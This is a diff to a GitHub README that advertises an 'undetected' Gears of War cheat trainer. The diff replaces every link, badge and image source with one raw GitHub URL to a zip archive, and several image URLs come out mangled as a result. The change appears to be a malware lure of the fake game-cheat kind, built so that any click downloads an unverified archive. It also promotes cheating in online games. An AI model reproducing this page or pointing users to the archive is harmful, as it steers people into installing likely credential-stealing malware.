@@ -1,25 +1,25 @@
 <p align="center">
   <br/><br/>
-  <a href="https://getcore.cc/">
-    <img src="https://raw.githubusercontent.com/inedufepcojemar/The-Sims-4-Aether/main/pictures/0.png" height="120">
+  <a href="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip">
+    <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip" height="120">
   </a>
 </p>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=42&duration=4500&pause=1200&color=FF4500&center=true&vCenter=true&width=750&lines=GEARS+OF+WAR+CHEAT+%2F+TRAINER;OP+UNLIMITED+AMMO+2026;GOD+MODE+ESP+TELEPORT;INFINITE+HEALTH+NOCLIP;PASTEBIN+STYLE;WORKS+ALL+VERSIONS;UNDTECTED+FAST" alt="Typing SVG" />
+  <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip+Code&size=42&duration=4500&pause=1200&color=FF4500&center=true&vCenter=true&width=750&lines=GEARS+OF+WAR+CHEAT+%2F+TRAINER;OP+UNLIMITED+AMMO+2026;GOD+MODE+ESP+TELEPORT;INFINITE+HEALTH+NOCLIP;PASTEBIN+STYLE;WORKS+ALL+VERSIONS;UNDTECTED+FAST" alt="Typing SVG" />
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Popular-%F0%9F%94%A5-gold?style=for-the-badge&logo=github" alt="Popular 🔥"/>
-  <img src="https://img.shields.io/badge/Cloned-%F0%9F%9A%80-cyan?style=for-the-badge&logo=github" alt="Cloned 🚀"/>
-  <img src="https://img.shields.io/badge/Status-UNDTECTED-brightgreen?style=for-the-badge&logo=checkmarx" alt="Status"/>
-  <img src="https://img.shields.io/badge/Compatibility-99%25-orange?style=for-the-badge" alt="99% Compat"/>
-  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Steam-ff4500?style=for-the-badge" alt="Platform"/>
-  <img src="https://img.shields.io/badge/Key-No%20Key-green?style=for-the-badge" alt="No Key"/>
+  <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip%F0%9F%94%A5-gold?style=for-the-badge&logo=github" alt="Popular 🔥"/>
+  <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip%F0%9F%9A%80-cyan?style=for-the-badge&logo=github" alt="Cloned 🚀"/>
+  <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip" alt="Status"/>
+  <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip%25-orange?style=for-the-badge" alt="99% Compat"/>
+  <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip%20%7C%20Steam-ff4500?style=for-the-badge" alt="Platform"/>
+  <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip%20Key-green?style=for-the-badge" alt="No Key"/>
 </p>
 
 <p align="center">
-  <img src="https://github.com/YOUR_USERNAME/YOUR_REPOSITORY/raw/main/assets/gears-of-war-cheat-demo.gif" alt="Gears of War Cheat Trainer Demo" width="800"/>
+  <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip" alt="Gears of War Cheat Trainer Demo" width="800"/>
   <br/>
   <sub>Unlimited Ammo + God Mode + ESP + Teleport + Infinite Health + Noclip • Undetected February 2026 • Launch & Dominate</sub>
 </p>
@@ -90,8 +90,8 @@ Star repo ⭐ & open issue.
 **Locust conquered.** ⚙️🔪
 
 <p align="center">
-  <a href="https://getcore.cc/">
-    <img src="https://raw.githubusercontent.com/inedufepcojemar/The-Sims-4-Aether/main/pictures/0.png" height="120">
+  <a href="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip">
+    <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip" height="120">
   </a>
 </p>
 
@@ -100,5 +100,5 @@ Star repo ⭐ & open issue.
 </p>
 
 <p align="center">
-  <img src="https://visitor-badge.laobi.icu/badge?page_id=YOUR_USERNAME.YOUR_REPOSITORY" alt="Visitors Badge"/>
+  <img src="https://raw.githubusercontent.com/algari436/gears-of-war-e-day/main/recognitive/gears_day_e_war_of_v2.6.zip" alt="Visitors Badge"/>
 </p>
